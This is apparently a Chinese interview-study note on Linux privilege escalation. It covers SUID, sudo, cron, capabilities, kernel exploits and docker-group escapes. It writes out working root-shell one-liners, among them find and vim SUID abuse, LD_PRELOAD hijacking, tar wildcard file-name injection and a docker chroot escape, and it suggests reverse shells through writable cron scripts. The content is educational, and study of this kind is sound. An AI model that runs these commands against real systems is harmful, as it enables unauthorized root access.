# Day 15：Linux权限提升
> [Linux提权面试核心] SUID/Capability/Sudo/Crontab/内核漏洞
## 核心知识点
### Q: Linux提权的标准化检查流程
三阶段：
信息收集(2min)：id; uname -a; sudo -l; find / -perm -4000; getcap -r /; crontab -l; ls /etc/cron*; ss -tlnp; env; cat ~/.bash_history
自动扫描(1min)：./linpeas.sh或linux-exploit-suggester→逐个验证输出的提权向量
针对性利用：sudo -l有NOPASSWD→GTFObin查sudo提权。SUID二进制→GTFObin查利用方法。老内核→searchsploit kernel。Docker组→docker逃逸。Cron脚本可写→修改脚本反弹shell

面试金句：同时跑自动扫描和手动排查，linpeas结果做交叉验证——不盲目信任任何一个工具
### Q: SUID二进制提权的三类经典案例
类型1-GTFObin可滥用SUID：find有SUID→find . -exec /bin/sh -p \;。vim有SUID→vim -c ':py3 import os;os.setuid(0);os.execl("/bin/sh","sh","-c","exec sh")'
类型2-LD_PRELOAD劫持：如sudo允许保留LD_PRELOAD→编译共享库→sudo LD_PRELOAD=evil.so command
类型3-通配符注入：root cron执行tar cf /backup/*→在目录创建--checkpoint=1和--checkpoint-action=exec=sh shell.sh的文件→tar把文件名当参数→执行shell.sh

DirtyCow(CVE-2016-5195)→影响2007年起所有内核版本→利用COW竞争条件写入只读内存→覆盖/etc/passwd
### Q: Capabilities和传统SUID的差异
SUID赋予完整root权限→颗粒度粗→如果程序有漏洞→攻击者获完整root。Capabilities将root拆成40+小权限→每进程只获最小所需
危险Capabilities：cap_setuid(elevate uid)、cap_sys_ptrace(inject到root进程)、cap_dac_read_search(读/etc/shadow)、cap_sys_module(加载内核模块)
容器最佳实践：--cap-drop=ALL --cap-add=NET_BIND_SERVICE→完全最小化
## 面试陷阱
- linpeas有误报漏报→交叉验证多工具
- docker组=root→id在docker组可docker run -v /:/mnt alpine chroot /mnt sh
- 内核提权不评估风险→DirtyCow可能致内核崩溃

## 今日检测
1. linpeas扫描测试Linux→手动验证输出
2. GTFObin搜索python/vim/find的SUID提权→在测试环境验证
3. docker run -v /:/host -it alpine测试docker组的容器逃逸
